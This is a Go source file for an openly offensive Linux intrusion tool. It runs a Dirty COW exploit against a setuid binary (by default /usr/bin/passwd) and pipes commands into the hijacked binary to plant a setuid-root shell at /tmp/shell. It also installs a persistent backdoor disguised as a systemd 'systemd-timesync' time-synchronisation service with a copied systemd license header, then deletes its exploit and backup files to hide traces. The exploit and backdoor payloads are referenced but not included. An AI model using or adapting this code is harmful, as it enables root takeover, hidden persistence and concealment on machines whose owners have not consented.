package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
)

const ServiceName = "systemd-timesync"
const ShellPath = "/tmp/shell"
var BackdoorPath = fmt.Sprintf("/lib/systemd/%s", ServiceName)
var BackdoorServicePath = fmt.Sprintf("/lib/systemd/system/%s.service", ServiceName)

var BackdoorServiceFile = fmt.Sprintf(`#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.

[Unit]
Description=Network Time Synchronization
Documentation=man:systemd-timesyncd.service(8)
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart=/lib/systemd/%s
`, ServiceName)

func main() {
	path := flag.String("file", "/usr/bin/passwd", "File to pwn")
	flag.Parse()

	if *path == "" {
		flag.Usage()
		os.Exit(1)
	}

	orig, err := ioutil.ReadFile(*path)
	if err != nil {
		log.Fatalf("Failed to read original file: %s", err)
	}

	mkTemp := func() *os.File {
		f, err := ioutil.TempFile("", "systemd-timesyncd")
		if err != nil {
			log.Fatalf("Failed to create temp file: %s", err)
		}
		return f
	}

	bkp := mkTemp()
	_, err = bkp.Write(orig)
	if err != nil {
		log.Fatalf("Failed to backup %s: %s", *path, err)
	}

	if err = bkp.Close(); err != nil {
		log.Fatalf("Failed to close backup file at %s: %s", bkp.Name(), err)
	}

	cow := mkTemp()
	_, err = cow.Write(DirtyCow)
	if err != nil {
		log.Fatalf("Failed write exploit to %s: %s", cow.Name(), err)
	}

	if err = cow.Chmod(0755); err != nil {
		log.Fatalf("Failed chmod 0755 %s: %s", cow.Name(), err)
	}

	if err = cow.Close(); err != nil {
		log.Fatalf("Failed to close expoit")
	}

	backdoorService := mkTemp()
	_, err = backdoorService.Write([]byte(BackdoorServiceFile))
	if err != nil {
		log.Fatalf("Failed write systemd file to %s: %s", backdoorService.Name(), err)
	}

	if err = backdoorService.Close(); err != nil {
		log.Fatalf("Failed to close systemd file")
	}

	backdoor := mkTemp()
	_, err = backdoor.Write(Backdoor)
	if err != nil {
		log.Fatalf("Failed write backdoor to %s: %s", backdoor.Name(), err)
	}

	if err = backdoor.Close(); err != nil {
		log.Fatalf("Failed to close backdoor")
	}

	out, err := exec.Command(cow.Name(), *path).CombinedOutput()
	if err != nil {
		log.Fatalf(`Failed to pwn %s: %s
Output: %s`, *path, err, string(out))
	}

	cmd := exec.Command(*path)

	// TODO: install reverse shell
	cmd.Stdin = bytes.NewBuffer([]byte(fmt.Sprintf(`echo 0 > /proc/sys/vm/dirty_writeback_centisecs
cp %s %s
chmod 4755 %s
cat %s > %s
rm -f %s
mv %s %s
chmod 0644 %s
chown root:root %s
mv %s %s
chmod 0755 %s
chown root:root %s
systemctl enable %s.service
systemctl start %s.service`,
		*path, ShellPath,
		ShellPath,
		bkp.Name(), *path,
		ShellPath,
		backdoorService.Name(), BackdoorServicePath,
		BackdoorServicePath,
		BackdoorServicePath,
		backdoor.Name(), BackdoorPath,
		BackdoorPath,
		BackdoorPath,
		ServiceName,
		ServiceName,
	)))

	out, err = cmd.CombinedOutput()
	if err != nil {
		log.Fatalf(`Failed to infect machine: %s
Output: %s`, err, string(out))
	}

	if err = os.Remove(cow.Name()); err != nil {
		log.Fatalf("Failed to remove exploit from %s: %s", cow.Name(), err)
	}

	if err = os.Remove(bkp.Name()); err != nil {
		log.Fatalf("Failed to remove backup from %s: %s", bkp.Name(), err)
	}
}
